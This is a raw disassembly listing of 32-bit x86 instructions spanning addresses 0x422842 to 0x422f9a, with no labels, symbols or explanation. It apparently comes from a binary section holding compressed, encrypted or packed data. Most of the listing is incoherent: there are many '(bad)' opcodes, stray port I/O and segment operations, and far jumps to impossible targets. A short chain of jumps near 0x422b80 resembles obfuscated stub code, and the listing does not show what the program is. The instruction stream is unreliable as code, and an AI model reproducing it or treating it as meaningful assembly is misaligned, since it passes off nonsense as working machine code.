  422842:	and    DWORD PTR [edi],eax
  422844:	adc    eax,0x9242a1b
  422849:	jb     0x422866
  42284b:	add    ah,BYTE PTR [esi-0x1c55401]
  422851:	jno    0x422881
  422853:	jbe    0x42286c
  422855:	jbe    0x42285c
  422857:	add    ebx,edx
  422859:	push   ss
  42285a:	jle    0x42289f
  42285c:	inc    ecx
  42285d:	pop    ss
  42285e:	addr16 dec edi
  422860:	push   ds
  422861:	push   esi
  422862:	add    BYTE PTR [ebx+0x7],dl
  422865:	call   DWORD PTR [ebp+0x7f]
  422868:	(bad)  
  422869:	push   esp
  42286a:	inc    esp
  42286b:	push   ds
  42286c:	dec    edi
  42286d:	pop    ebx
  42286e:	arpl   WORD PTR [edx+0x79],di
  422871:	jge    0x422892
  422873:	mov    es,WORD PTR [edi+0x77]
  422876:	jno    0x4228bb
  422878:	pop    eax
  422879:	je     0x4228ce
  42287b:	ins    BYTE PTR es:[edi],dx
  42287c:	imul   ebp,DWORD PTR [ebx+0x69fedff8],0x50
  422883:	dec    ebx
  422884:	and    eax,DWORD PTR [edi+0x42]
  422887:	push   edi
  422888:	mov    dh,0x45
  42288a:	push   ebp
  42288b:	ss pop ebx
  42288d:	es aas 
  42288f:	xor    ah,BYTE PTR [ecx+0x68]
  422892:	jb     0x4228c6
  422894:	push   0xfffffff8
  422896:	cld    
  422897:	(bad)  
  422898:	jg     0x4228f1
  42289a:	push   ecx
  42289b:	mov    esp,0x9192a3d
  4228a0:	sub    cl,BYTE PTR [ecx]
  4228a2:	and    ecx,DWORD PTR [edi]
  4228a4:	sbb    eax,0x53103a29
  4228a9:	adc    DWORD PTR [eax],esi
  4228ab:	cmp    edi,DWORD PTR [edi]
  4228ad:	or     BYTE PTR es:[eax+0x17],ch
  4228b1:	mov    bh,0xff
  4228b3:	add    eax,0x25568210
  4228b8:	xor    esi,DWORD PTR es:0x718182a
  4228bf:	push   es
  4228c0:	jnp    0x42288a
  4228c2:	add    ebp,DWORD PTR [esi+ebx*1-0x3]
  4228c6:	(bad)  
  4228c7:	(bad)  
  4228c8:	jmp    FWORD PTR [edx+0x1e]
  4228cb:	sub    al,0x2b
  4228cd:	je     0x4228fe
  4228cf:	jge    0x42294e
  4228d1:	add    al,0x4a
  4228d3:	dec    ecx
  4228d4:	push   0x5d
  4228d6:	or     al,0x46
  4228d8:	inc    esi
  4228d9:	add    esp,DWORD PTR [edi+0x1c]
  4228dc:	jno    0x422932
  4228de:	pop    ds
  4228df:	pop    esp
  4228e0:	dec    edx
  4228e1:	push   es
  4228e2:	push   esp
  4228e3:	pusha  
  4228e4:	ins    BYTE PTR es:[edi],dx
  4228e5:	ins    DWORD PTR es:[edi],dx
  4228e6:	jno    0x4228d0
  4228e8:	stos   BYTE PTR es:[edi],al
  4228e9:	in     eax,dx
  4228ea:	aaa    
  4228eb:	fdiv   QWORD PTR [ebp+0x13]
  4228ee:	push   ss
  4228ef:	push   eax
  4228f0:	push   ebx
  4228f1:	push   edi
  4228f2:	loopne 0x42295f
  4228f4:	das    
  4228f5:	hlt    
  4228f6:	sub    al,0x6d
  4228f8:	addr16 (bad) 
  4228fa:	fcomip st,st(4)
  4228fc:	mov    edi,0x2a5b5d52
  422901:	sub    DWORD PTR [edx+0x4a],edx
  422904:	pusha  
  422905:	imul   ebx,DWORD PTR [esi+ebp*2+0x12],0x72
  42290a:	push   edi
  42290b:	xor    dh,BYTE PTR [ebp+0x74]
  42290e:	aaa    
  42290f:	jae    0x422974
  422911:	and    DWORD PTR [ecx],eax
  422913:	add    DWORD PTR [eax],edi
  422915:	sbb    DWORD PTR [eax-0x6f],eax
  422918:	jge    0x4228dd
  42291a:	sub    eax,0x1d0c640c
  42291f:	push   eax
  422920:	push   edi
  422921:	and    eax,0xa2050ed8
  422926:	(bad)  
  422927:	jmp    FWORD PTR [edi]
  422929:	xchg   BYTE PTR [ebx+ebp*2],bl
  42292c:	outs   dx,BYTE PTR ds:[esi]
  42292d:	sbb    BYTE PTR es:[eax],al
  422930:	and    eax,0x3c382166
  422935:	das    
  422936:	cmp    eax,0x3c731b7f
  42293b:	sub    al,0x77
  42293d:	hlt    
  42293e:	(bad)  
  42293f:	inc    DWORD PTR [ebp-0x76]
  422942:	xor    esi,DWORD PTR cs:[esp]
  422946:	pop    ebx
  422947:	jne    0x4229a1
  422949:	pop    edx
  42294a:	jno    0x4229ae
  42294c:	dec    edx
  42294d:	pop    ecx
  42294e:	jge    0x4229ad
  422950:	jl     0x422997
  422952:	pop    esi
  422953:	imul   edi,DWORD PTR [ecx+0x73],0x0
  422957:	cld    
  422958:	jg     0x422955
  42295a:	pop    edi
  42295b:	and    al,0x69
  42295d:	pop    ds
  42295e:	dec    esi
  42295f:	inc    eax
  422960:	outs   dx,BYTE PTR ds:[esi]
  422961:	ins    BYTE PTR es:[edi],dx
  422962:	push   ecx
  422963:	jbe    0x4229c2
  422965:	inc    ebp
  422966:	in     al,dx
  422967:	adc    BYTE PTR [ebx+0x54],cl
  42296a:	outs   dx,DWORD PTR ds:[esi]
  42296b:	pop    edi
  42296c:	ins    DWORD PTR es:[edi],dx
  42296d:	jle    0x4229d9
  42296f:	jo     0x4229e1
  422971:	outs   dx,DWORD PTR ds:[esi]
  422972:	ds sub eax,0x378042bf
  422978:	add    al,0x62
  42297a:	je     0x4229dd
  42297c:	outs   dx,DWORD PTR ds:[esi]
  42297d:	ins    BYTE PTR es:[edi],dx
  42297e:	mov    ds:0x69776b64,al
  422983:	dec    esi
  422984:	dec    ebx
  422985:	(bad)  
  422986:	(bad)  
  422987:	(bad)  
  422988:	call   FWORD PTR [ecx+0x51]
  42298b:	push   esi
  42298c:	or     cl,BYTE PTR [ecx]
  42298e:	inc    edi
  42298f:	and    al,0x41
  422991:	cs sub al,0x36
  422994:	sub    dl,BYTE PTR ds:0x36312a29
  42299a:	pop    ss
  42299b:	cmp    bl,BYTE PTR [edx]
  42299d:	push   ss
  42299e:	sbb    DWORD PTR [edi],edx
  4229a0:	pop    ds
  4229a1:	pusha  
  4229a2:	and    DWORD PTR [edx],ebx
  4229a4:	gs ins BYTE PTR es:[edi],dx
  4229a6:	and    eax,DWORD PTR [eax]
  4229a8:	jge    0x4229a9
  4229aa:	idiv   BYTE PTR [edi+0x3e6437e2]
  4229b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229b1:	pop    ds
  4229b2:	xor    esi,DWORD PTR [eax]
  4229b4:	sbb    DWORD PTR [esi],ecx
  4229b6:	cmp    eax,0xb121624
  4229bb:	ds sub al,0x9
  4229be:	pop    edx
  4229bf:	pop    edi
  4229c0:	add    eax,0xf16e7452
  4229c5:	scas   eax,DWORD PTR es:[edi]
  4229c6:	pop    eax
  4229c7:	icebp  
  4229c8:	imul   edx,DWORD PTR [ebx+0xf],0x1
  4229cc:	je     0x4229ce
  4229ce:	pop    es
  4229cf:	sbb    BYTE PTR [ebp+0x79],0x42
  4229d3:	dec    ecx
  4229d4:	inc    esp
  4229d5:	push   eax
  4229d6:	imul   esp,DWORD PTR [esi-0x56],0xffffffff
  4229da:	(bad)  
  4229db:	fild   QWORD PTR [eax]
  4229dd:	pop    ss
  4229de:	pop    ecx
  4229df:	push   ebx
  4229e0:	inc    edx
  4229e1:	sbb    DWORD PTR [esi+0x27],eax
  4229e4:	js     0x422a0b
  4229e6:	jns    0x422a52
  4229e8:	push   0x7b
  4229ea:	daa    
  4229eb:	gs jae 0x422a6c
  4229ee:	jo     0x422a13
  4229f0:	push   0x2bb24b23
  4229f5:	push   ss
  4229f6:	loopne 0x422a05
  4229f8:	test   al,0x67
  4229fa:	dec    ebp
  4229fb:	xor    DWORD PTR [esi-0x72],ecx
  4229fe:	outs   dx,BYTE PTR ds:[esi]
  4229ff:	pusha  
  422a00:	mov    dh,0x5d
  422a02:	sub    bh,bh
  422a04:	mov    edi,0x3220f1dd
  422a09:	pop    ebp
  422a0a:	and    BYTE PTR [esi+0x7],ah
  422a0d:	add    DWORD PTR [ecx],ecx
  422a0f:	repnz xor edx,DWORD PTR [edx]
  422a12:	sub    al,0x6f
  422a14:	sbb    edi,DWORD PTR [edx]
  422a16:	sbb    eax,0xd10186b
  422a1b:	cmp    edx,DWORD PTR [eax]
  422a1d:	sbb    edx,edi
  422a1f:	(bad)  
  422a20:	(bad)  
  422a21:	(bad)  [esi+0x30]
  422a24:	hlt    
  422a25:	xor    eax,0x1d1e0439
  422a2a:	jnp    0x422a2c
  422a2c:	es xor al,0x35
  422a2f:	jl     0x422a39
  422a31:	push   ss
  422a32:	or     eax,0x7c75160a
  422a37:	or     ch,BYTE PTR [ebx+0x4e]
  422a3a:	ins    BYTE PTR es:[edi],dx
  422a3b:	jno    0x422a28
  422a3d:	jg     0x422a02
  422a3f:	scas   eax,DWORD PTR es:[edi]
  422a40:	jo     0x422a46
  422a42:	pop    ebp
  422a43:	or     eax,0x82055405
  422a48:	add    eax,0x47537b19
  422a4d:	pop    ebx
  422a4e:	inc    ebp
  422a4f:	dec    esi
  422a50:	jl     0x422a64
  422a52:	dec    esp
  422a53:	clc    
  422a54:	fild   WORD PTR ds:0x5a461236
  422a5a:	xor    eax,0x6c4b452b
  422a5f:	je     0x422acc
  422a61:	fdiv   st(0),st
  422a63:	jg     0x422a36
  422a65:	cmp    edx,DWORD PTR [edx+0x51]
  422a68:	imul   ecx,DWORD PTR [eax+0x75],0x7c3e5c60
  422a6f:	ins    DWORD PTR es:[edi],dx
  422a70:	cmp    eax,DWORD PTR [eax+0x30]
  422a73:	xor    cl,BYTE PTR [edi+0x28]
  422a76:	fs dec edi
  422a78:	outs   dx,DWORD PTR ds:[esi]
  422a79:	mov    ds:0x2b4c05ff,al
  422a7e:	pop    eax
  422a7f:	pop    eax
  422a80:	and    eax,0x915552a
  422a85:	nop    esi
  422a88:	test   al,0x9
  422a8a:	adc    DWORD PTR [edx],esi
  422a8c:	sub    eax,0xffffe0b4
  422a91:	das    
  422a92:	and    BYTE PTR [edi],bl
  422a94:	push   ss
  422a95:	adc    BYTE PTR cs:[ebx+ebx*1],ch
  422a99:	jns    0x422ad0
  422a9b:	adc    dh,BYTE PTR [edi+0x3d]
  422a9e:	pop    ss
  422a9f:	add    al,0x1c
  422aa1:	sub    BYTE PTR ds:0x1423f21d,ch
  422aa7:	(bad)  
  422aa8:	mov    edi,0x2698df00
  422aad:	sub    BYTE PTR [edi+0x4a],ch
  422ab0:	or     eax,0x495b4e00
  422ab5:	jae    0x422b2a
  422ab7:	or     al,0x42
  422ab9:	inc    ecx
  422aba:	ja     0x422b0f
  422abc:	jge    0x422b1d
  422abe:	pusha  
  422abf:	pop    ds
  422ac0:	(bad)  
  422ac1:	(bad)  
  422ac3:	push   ebp
  422ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ac5:	dec    ecx
  422ac6:	dec    ebp
  422ac7:	dec    esi
  422ac8:	inc    edx
  422ac9:	jb     0x422b4a
  422acb:	bound  esp,QWORD PTR [ebp-0x44]
  422ace:	inc    ebp
  422acf:	push   0x4f7b5b44
  422ad4:	dec    ebx
  422ad5:	arpl   WORD PTR [ebx+0x7a],dx
  422ad8:	js     0x422b1f
  422ada:	inc    esp
  422adb:	(bad)  
  422adc:	mov    edi,0x7666ffe0
  422ae1:	push   0x7a40465a
  422ae6:	pop    edx
  422ae7:	xor    ebp,DWORD PTR [ecx+0x4d]
  422aea:	cli    
  422aeb:	dec    eax
  422aec:	dec    edi
  422aed:	aaa    
  422aee:	inc    edi
  422aef:	imul   esp,DWORD PTR [edi+0x3],0x2038350c
  422af6:	sub    al,BYTE PTR [edi]
  422af8:	push   edi
  422af9:	js     0x422ac2
  422afb:	fcomip st,st(0)
  422afd:	pop    ds
  422afe:	push   edi
  422aff:	adc    BYTE PTR ss:[edx+0x2f],dl
  422b03:	adc    eax,0x226f296e
  422b08:	or     esp,edi
  422b0a:	xor    ebp,DWORD PTR [esi+0x23]
  422b0d:	gs stos BYTE PTR es:[edi],al
  422b0f:	(bad)  
  422b10:	inc    DWORD PTR ds:0x2b213778
  422b16:	das    
  422b17:	xor    al,0x0
  422b19:	sub    DWORD PTR [edi],esp
  422b1b:	sbb    DWORD PTR [edi],eax
  422b1d:	sub    dl,BYTE PTR [ebx]
  422b1f:	xor    al,BYTE PTR [edi]
  422b21:	or     eax,DWORD PTR [ebx]
  422b23:	jns    0x422b94
  422b25:	mov    ebx,ds
  422b27:	jg     0x422afc
  422b29:	inc    DWORD PTR [ebp+0x74]
  422b2c:	emms   
  422b2e:	dec    esi
  422b2f:	push   ebp
  422b30:	jo     0x422ba6
  422b32:	addr16 inc esp
  422b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b35:	push   esi
  422b36:	or     BYTE PTR [edx],bl
  422b38:	data16 sbb BYTE PTR [ebx+ebx*1],bl
  422b3c:	jl     0x422bb7
  422b3e:	sbb    BYTE PTR [esi+0x66],bl
  422b41:	loopne 0x422b42
  422b43:	mov    edi,0x41175de0
  422b48:	push   cs
  422b49:	dec    eax
  422b4a:	push   ebx
  422b4b:	sub    cl,BYTE PTR [ebx+0x7a]
  422b4e:	dec    ebp
  422b4f:	xor    dh,BYTE PTR [eax+0x72]
  422b52:	jo     0x422bb0
  422b54:	jle    0x422baf
  422b56:	inc    ecx
  422b57:	daa    
  422b58:	and    al,0x5d
  422b5a:	add    eax,0xba66fa4d
  422b5f:	pusha  
  422b60:	ins    DWORD PTR es:[edi],dx
  422b61:	dec    esi
  422b62:	cmp    DWORD PTR [ebp-0x6c],edi
  422b65:	sub    al,0xdc
  422b67:	or     ah,BYTE PTR [edi]
  422b69:	or     BYTE PTR [edi],ah
  422b6b:	sbb    edi,ebx
  422b6d:	pop    edi
  422b6e:	jmp    FWORD PTR [edi+0x4d88f994]
  422b74:	(bad)  
  422b75:	mov    esi,0x8a3deb50
  422b7a:	pop    ebp
  422b7b:	(bad)  
  422b7c:	jmp    0x422bae
  422b7e:	mul    esi
  422b80:	jmp    0x422bdd
  422b82:	loopne 0x422b1f
  422b84:	add    ebp,edi
  422b86:	push   ebx
  422b87:	jmp    0x422bad
  422b89:	jmp    0x422bad
  422b8b:	jmp    0x422bf5
  422b8d:	jmp    0x422bab
  422b8f:	cmp    edi,0xfffffadb
  422b95:	and    eax,DWORD PTR [edx-0xc]
  422b98:	xor    BYTE PTR [eax],bl
  422b9a:	jmp    0x422ba0
  422b9c:	neg    esi
  422b9e:	jmp    0x422ba6
  422ba0:	inc    eax
  422ba1:	jmp    0x422bb5
  422ba3:	pop    ebx
  422ba4:	jmp    0x422bc3
  422ba6:	cmp    eax,edx
  422ba8:	jmp    0x422b81
  422baa:	jmp    0x422bb1
  422bac:	mov    edi,0x6045fffd
  422bb1:	jmp    0x422bd2
  422bb3:	loop   0x422be6
  422bb5:	jmp    0x422ba5
  422bb7:	dec    bl
  422bb9:	jmp    0x422bde
  422bbb:	push   ecx
  422bbc:	jmp    0x422b87
  422bbe:	shr    edx,0x34
  422bc1:	add    eax,0xeb59d5eb
  422bc6:	pop    es
  422bc7:	out    dx,al
  422bc8:	dec    edx
  422bc9:	shr    BYTE PTR [edi+0x12],cl
  422bcc:	dec    ebx
  422bcd:	not    ebx
  422bcf:	jmp    0x422ba0
  422bd1:	pop    eax
  422bd2:	shl    ah,0xad
  422bd5:	arpl   WORD PTR [edi+edi*8+0x5e75c0db],sp
  422bdc:	mov    al,ds:0xf8ebdb84
  422be1:	mul    edi
  422be3:	jmp    0x422b91
  422be5:	jmp    0x422b99
  422be7:	lods   al,BYTE PTR ds:[esi]
  422be8:	push   0xffffff97
  422bea:	shr    BYTE PTR [edx],0xb7
  422bed:	cwde   
  422bee:	loopne 0x422bf4
  422bf0:	call   0x52deb399
  422bf5:	iret   
  422bf6:	xor    eax,0xa43ef4b
  422bfb:	cdq    
  422bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bfd:	sbb    edx,DWORD PTR [esi-0x46]
  422c00:	dec    esp
  422c01:	dec    ebx
  422c02:	scas   eax,DWORD PTR es:[edi]
  422c03:	adc    esp,DWORD PTR [eax+0x52]
  422c06:	sub    al,BYTE PTR [ebp-0xe]
  422c09:	jg     0x422bb3
  422c0b:	adc    eax,0x333f9d81
  422c10:	mul    BYTE PTR [ebp-0x4]
  422c13:	dec    ebx
  422c14:	cdq    
  422c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c16:	inc    edi
  422c17:	dec    ebp
  422c18:	mov    bl,0xe3
  422c1a:	ss mov ah,0x16
  422c1d:	data16 mov WORD PTR [ebp+0x33e44822],cs
  422c24:	(bad)  [edi+0x7b6d76f0]
  422c2a:	mov    esi,0xff02548a
  422c2f:	xor    dh,bh
  422c31:	inc    eax
  422c32:	and    al,0x7d
  422c34:	cmp    dl,BYTE PTR [ecx+ebx*1]
  422c37:	jne    0x422c3e
  422c39:	es xchg esp,eax
  422c3b:	cmp    eax,0x41
  422c3e:	jne    0x422c26
  422c40:	mov    WORD PTR [ebp+0x2a],ss
  422c43:	rcr    BYTE PTR ss:[edx+0x14],cl
  422c47:	shl    eax,0x6e
  422c4a:	mov    ds:0xb2b0353d,al
  422c4f:	add    edx,0x6
  422c52:	ret    0x86c7
  422c55:	fldenv [esi+0x6d832008]
  422c5b:	or     bl,BYTE PTR [esi+0x7c]
  422c5e:	shl    DWORD PTR [edx-0x11462023],cl
  422c64:	aad    0x16
  422c66:	xchg   ebp,eax
  422c67:	shl    eax,cl
  422c69:	push   eax
  422c6a:	pop    esi
  422c6b:	retfw  0xc3f
  422c6f:	in     eax,dx
  422c70:	fs popa 
  422c72:	hlt    
  422c73:	sbb    DWORD PTR [esi],0xd2b07980
  422c79:	and    esi,eax
  422c7b:	or     BYTE PTR [esi-0x7f],cl
  422c7e:	into   
  422c7f:	or     al,0x46
  422c81:	jp     0x422c27
  422c83:	sub    BYTE PTR [edi],0x22
  422c86:	js     0x422c56
  422c88:	mov    BYTE PTR [eax+edx*1],cl
  422c8b:	inc    DWORD PTR [esi+0x43]
  422c8e:	pop    esp
  422c8f:	xchg   DWORD PTR [ebp+esi*1-0x74],esi
  422c93:	jne    0x667e3212
  422c99:	xchg   esi,eax
  422c9a:	xor    DWORD PTR [eax],ebx
  422c9c:	pushf  
  422c9d:	push   0xe6eae86f
  422ca2:	xchg   edx,eax
  422ca3:	dec    ebx
  422ca4:	call   0x32735ce9
  422ca9:	clc    
  422caa:	add    eax,0x354cbfc2
  422caf:	ss aaa 
  422cb1:	cmp    BYTE PTR [ecx],bh
  422cb3:	inc    ecx
  422cb4:	inc    edx
  422cb5:	inc    ebx
  422cb6:	pusha  
  422cb7:	inc    edi
  422cb8:	dec    eax
  422cb9:	dec    ecx
  422cba:	dec    edx
  422cbb:	dec    ebx
  422cbc:	dec    esp
  422cbd:	call   DWORD PTR [edi+0x51]
  422cc0:	jmp    0x5554:0x53884fac
  422cc7:	push   esi
  422cc8:	push   edi
  422cc9:	pop    eax
  422cca:	pop    ecx
  422ccb:	pop    edx
  422ccc:	popa   
  422ccd:	bound  esp,QWORD PTR [ebx-0xf]
  422cd0:	call   FWORD PTR [ebp-0x1]
  422cd3:	fs gs addr16 pushw 0x6a69
  422cda:	imul   edx,DWORD PTR [eax+0x6e],0x6f
  422cde:	jo     0x422d51
  422ce0:	jb     0x422d55
  422ce2:	je     0x422d59
  422ce4:	jbe    0x422d5d
  422ce6:	js     0x422d61
  422ce8:	jp     0x422d1c
  422cea:	je     0x422d57
  422cec:	shr    BYTE PTR [edi+eax*1+0x25],0x14
  422cf1:	jae    0x422d31
  422cf3:	xchg   BYTE PTR [ecx-0x42],cl
  422cf6:	push   edi
  422cf7:	or     al,0x73
  422cf9:	leave  
  422cfa:	iret   
  422cfb:	mov    eax,0x5f20566c
  422d00:	fcom   QWORD PTR [edi+edx*8]
  422d03:	ror    BYTE PTR [ebx+0x41],1
  422d06:	or     eax,0xd62103bd
  422d0b:	fsub   QWORD PTR [esi]
  422d0d:	mov    esp,0x2af9a7be
  422d12:	out    dx,al
  422d13:	mov    WORD PTR [esi],es
  422d15:	mov    al,0x57
  422d17:	pop    esp
  422d18:	hlt    
  422d19:	push   ss
  422d1a:	les    ebx,FWORD PTR [ecx-0x65]
  422d1d:	int    0xf6
  422d1f:	ins    BYTE PTR es:[edi],dx
  422d20:	and    al,0x5c
  422d22:	pop    ebx
  422d23:	push   cs
  422d24:	sub    al,0x5f
  422d26:	cld    
  422d27:	pop    esi
  422d28:	push   0x6cefb4bf
  422d2d:	ss call 0x170245f0
  422d33:	xor    cl,0x6
  422d36:	push   eax
  422d37:	stc    
  422d38:	mov    ah,0x67
  422d3a:	sti    
  422d3b:	or     al,0xc8
  422d3d:	push   ds
  422d3e:	fadd   st(7),st
  422d40:	out    dx,eax
  422d41:	push   es
  422d42:	or     ah,al
  422d44:	lock cmp ch,dh
  422d47:	mov    ebp,0x364894a7
  422d4c:	clc    
  422d4d:	push   cs
  422d4e:	cmp    BYTE PTR [eax],ch
  422d50:	mov    esp,0x2d549af9
  422d55:	into   
  422d56:	add    al,0x54
  422d58:	aam    0x16
  422d5a:	sub    BYTE PTR [eax+eax*8],bh
  422d5d:	and    eax,0x3b54b0b2
  422d62:	(bad)  
  422d63:	(bad)  
  422d64:	jb     0x422d02
  422d66:	in     al,0xcb
  422d68:	mov    esi,0x37d4b804
  422d6d:	psubw  mm0,QWORD PTR [ecx-0x48]
  422d71:	mov    WORD PTR [esi+eax*4],ss
  422d74:	dec    ebp
  422d75:	in     al,dx
  422d76:	mov    eax,0xb8c15b7d
  422d7b:	pushf  
  422d7c:	sbb    dh,BYTE PTR [ebp-0x47ed5346]
  422d82:	lods   al,BYTE PTR ds:[esi]
  422d83:	jo     0x422d95
  422d85:	push   eax
  422d86:	mov    al,0x1d
  422d88:	(bad)  
  422d8a:	ffreep st(5)
  422d8c:	and    esi,DWORD PTR [edi+0x56fce921]
  422d92:	call   0x1c9fe64f
  422d97:	lea    ebx,[edi+eiz*4-0x80]
  422d9b:	or     eax,0x26b8d309
  422da0:	adc    DWORD PTR ds:0x946dc837,ecx
  422da6:	loopne 0x422d60
  422da8:	les    esp,FWORD PTR [ecx-0x21cfc889]
  422dae:	mov    cl,0xcd
  422db0:	lea    edx,ds:0xef5a6eb1
  422db6:	sub    DWORD PTR [ebp+0x6e],ecx
  422db9:	cmp    BYTE PTR [ecx],al
  422dbb:	cmp    DWORD PTR [ebp+ebx*8-0x45dbc5ff],esp
  422dc2:	inc    edi
  422dc3:	outs   dx,BYTE PTR ds:[esi]
  422dc4:	inc    edi
  422dc5:	mov    edx,0x5bd4edd4
  422dca:	int3   
  422dcb:	mov    ds,esp
  422dcd:	mov    eax,0xa6862e0
  422dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dd3:	fisubr WORD PTR [ecx+0x79]
  422dd6:	mov    ds:0x3e8813e0,eax
  422ddb:	ja     0x422d81
  422ddd:	sti    
  422dde:	jbe    0x422df5
  422de0:	mov    ecx,0xecbafcd1
  422de5:	jne    0x422dd3
  422de7:	popf   
  422de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422de9:	pushf  
  422dea:	inc    esi
  422deb:	in     eax,0x48
  422ded:	idiv   DWORD PTR [ebx]
  422def:	mov    WORD PTR [edx+0x63f427f4],?
  422df5:	hlt    
  422df6:	xchg   esp,eax
  422df7:	push   ss
  422df8:	jb     0x422e33
  422dfa:	push   esp
  422dfb:	mov    ecx,0x2054d8d
  422e00:	add    DWORD PTR [esi-0x4390186a],eax
  422e06:	inc    edx
  422e07:	adc    BYTE PTR [edi],bh
  422e09:	push   ecx
  422e0a:	dec    ecx
  422e0b:	inc    ebp
  422e0c:	inc    edx
  422e0d:	ja     0x422e76
  422e0f:	gs out 0xfb,eax
  422e12:	cmp    BYTE PTR ds:0x646568ef,al
  422e18:	dec    edi
  422e19:	add    eax,0xf92f24f2
  422e1e:	jae    0x422e6b
  422e20:	jb     0x422e89
  422e22:	ins    DWORD PTR es:[edi],dx
  422e23:	inc    ebx
  422e24:	jae    0x422e7c
  422e26:	dec    edx
  422e27:	push   ebp
  422e28:	add    al,bl
  422e2a:	iret   
  422e2b:	pop    ds
  422e2c:	dec    edi
  422e2d:	bound  ecx,QWORD PTR [ebp+0x4c]
  422e30:	fs js  0x422e7e
  422e33:	add    BYTE PTR [ecx],al
  422e35:	repz pop es
  422e37:	in     al,dx
  422e38:	mov    ds:0x37408d02,eax
  422e3d:	xor    dl,BYTE PTR [ebx]
  422e3f:	mov    eax,eax
  422e41:	add    cl,bl
  422e43:	ins    BYTE PTR es:[edi],dx
  422e44:	scas   eax,DWORD PTR es:[edi]
  422e45:	mov    ebp,0x23404707
  422e4a:	es in  al,dx
  422e4c:	and    al,0xc8
  422e4e:	sub    ah,bl
  422e50:	(bad)  
  422e51:	(bad)  
  422e52:	dec    ebx
  422e54:	int3   
  422e55:	enter  0xd7c9,0xcf
  422e59:	enter  0xcecd,0xdb
  422e5d:	fcomp  st(2)
  422e5f:	fxch   st(2)
  422e61:	(bad)  
  422e63:	(bad)  
  422e65:	loopne 0x422e48
  422e67:	jecxz  0x422e69
  422e69:	in     al,0xe5
  422e6b:	pop    esi
  422e6c:	and    dl,ah
  422e6e:	sahf   
  422e6f:	or     BYTE PTR [edi],ch
  422e71:	xchg   BYTE PTR [edx-0x45],dl
  422e74:	outs   dx,BYTE PTR ds:[esi]
  422e75:	add    eax,0x20381a21
  422e7a:	gs pop ds
  422e7c:	and    BYTE PTR [ecx],al
  422e7e:	popa   
  422e7f:	je     0x422ed9
  422e81:	or     al,0xb8
  422e83:	leave  
  422e84:	and    BYTE PTR [eax],dh
  422e86:	ds ja  0x422e5b
  422e89:	inc    BYTE PTR [esi-0x69cd70d8]
  422e8f:	pop    ds
  422e90:	add    BYTE PTR [eax+eax*1],bl
  422e93:	push   es
  422e94:	push   ds
  422e95:	fiadd  DWORD PTR [eax+0x1d136c0d]
  422e9b:	das    
  422e9c:	add    eax,esp
  422e9e:	push   esp
  422e9f:	test   BYTE PTR [esi+0x706c477c],al
  422ea5:	jns    0x422e45
  422ea7:	ja     0x422ecb
  422ea9:	fiadd  WORD PTR [esi]
  422eab:	inc    esi
  422eac:	add    BYTE PTR [eax-0x40],0x1
  422eb0:	iret   
  422eb1:	repz push es
  422eb3:	add    DWORD PTR [esi],eax
  422eb5:	add    al,BYTE PTR [ebx]
  422eb7:	hlt    
  422eb8:	pusha  
  422eb9:	les    esp,FWORD PTR [edx+0x6fcbeae]
  422ebf:	popa   
  422ec0:	daa    
  422ec1:	sbb    esp,edi
  422ec3:	mov    eax,ds:0x3f960a26
  422ec8:	data16 repz fidivr DWORD PTR [edi+0x5263400]
  422ed0:	and    eax,0xcc642a2e
  422ed5:	pop    ebp
  422ed6:	inc    esi
  422ed7:	aam    0x6
  422ed9:	fsubr  st(6),st
  422edb:	repz cmp al,0xcf
  422ede:	in     al,0xec
  422ee0:	hlt    
  422ee1:	cld    
  422ee2:	add    al,0x5e
  422ee4:	sahf   
  422ee5:	out    0x79,eax
  422ee7:	sahf   
  422ee8:	or     al,0x14
  422eea:	sbb    al,0x24
  422eec:	sub    al,0x34
  422eee:	jns    0x422e8e
  422ef0:	out    0x79,eax
  422ef2:	cmp    al,0x44
  422ef4:	dec    esp
  422ef5:	push   esp
  422ef6:	pop    esp
  422ef7:	out    0x79,eax
  422ef9:	sahf   
  422efa:	out    0x64,eax
  422efc:	ins    BYTE PTR es:[edi],dx
  422efd:	je     0x422f7b
  422eff:	test   BYTE PTR [esi-0x73618619],bl
  422f05:	xchg   esp,eax
  422f06:	pushf  
  422f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f08:	lods   al,BYTE PTR ds:[esi]
  422f09:	mov    ah,0x79
  422f0b:	sahf   
  422f0c:	out    0x79,eax
  422f0e:	mov    esp,0xdcd4ccc4
  422f13:	cs js  0x422eb4
  422f16:	out    0xe4,eax
  422f18:	in     al,dx
  422f19:	hlt    
  422f1a:	add    ah,BYTE PTR [edi-0x6362f3fd]
  422f20:	fmul   QWORD PTR [edi]
  422f22:	add    al,0x5
  422f24:	fs pop ebp
  422f26:	xchg   edx,eax
  422f27:	xchg   ecx,eax
  422f28:	mov    ecx,0xf6a65df
  422f2d:	pusha  
  422f2e:	xchg   ebx,eax
  422f2f:	xchg   ecx,eax
  422f30:	daa    
  422f31:	daa    
  422f32:	mov    eax,0x64c4636c
  422f37:	in     al,0xc9
  422f39:	enter  0x641c,0x74
  422f3d:	sub    BYTE PTR [ebp-0x20],ah
  422f40:	jns    0x422fb4
  422f42:	xor    dh,dl
  422f44:	inc    eax
  422f45:	data16 hlt 
  422f47:	cwde   
  422f48:	dec    esp
  422f49:	mov    ?,WORD PTR [si]
  422f4c:	cdq    
  422f4d:	or     BYTE PTR [eax+0x68646150],ch
  422f53:	add    al,0xe5
  422f55:	and    eax,DWORD PTR [edi+0x18]
  422f58:	imul   eax,ecx,0x1120591e
  422f5e:	mov    ds:0x874c818b,al
  422f63:	mov    edi,0x138779e
  422f68:	pop    ds
  422f69:	pushf  
  422f6a:	call   0xd0fe35d5
  422f6f:	cmp    al,0xcd
  422f71:	out    0x79,eax
  422f73:	loopne 0x422f65
  422f75:	add    cl,ch
  422f77:	adc    al,0x24
  422f79:	repz cmp al,0xcf
  422f7c:	repz xor al,0x48
  422f7f:	pop    eax
  422f80:	push   0x3cf3cf78
  422f85:	iret   
  422f86:	mov    BYTE PTR [eax-0x2737475c],bl
  422f8c:	jnp    0x422f74
  422f8e:	in     al,dx
  422f8f:	cmp    al,0xec
  422f91:	enter  0x403,0x7
  422f95:	adc    eax,0xc761de76
  422f9a:	es aam 0xf0
